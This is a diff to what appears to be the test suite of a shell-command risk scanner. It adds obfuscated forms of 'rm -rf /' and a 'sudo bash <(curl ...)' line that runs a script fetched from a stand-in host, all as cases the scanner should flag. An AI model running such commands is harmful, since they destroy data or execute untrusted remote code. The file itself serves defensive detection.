@@ -215,6 +215,7 @@ async fn ansi_c_quoting_is_unescaped_before_scanning() {
             "$'\\162m' -rf /",
             "bash -c $'rm -rf /'",
             "$'rm' $'-rf' $'/'",
+            "$'\\u0072\\u006d' -rf /",
         ],
         RiskLevel::Critical,
     )
@@ -257,7 +258,10 @@ async fn fetch_and_execute_without_a_pipe_is_flagged() {
     )
     .await;
     assert_at_least(
-        &["sudo bash <(curl -s https://x.example/i.sh)"],
+        &[
+            "sudo bash <(curl -s https://x.example/i.sh)",
+            "sudo -u root bash <(curl https://x.example/i.sh)",
+        ],
         RiskLevel::Critical,
     )
     .await;
@@ -280,6 +284,7 @@ async fn benign_wrappers_and_mentions_stay_below_high() {
         "chmod -R u+w ~/projects/app",
         "base64 -d file.txt > out.bin",
         "echo aGk= | base64 -d",
+        "echo \"$(echo cm0gLXJmIC8= | base64 -d)\"",
         "python3 -c 'print(1)'",
         "python3 -c 'import shutil; shutil.rmtree(\"build\")'",
         "git status; git diff",
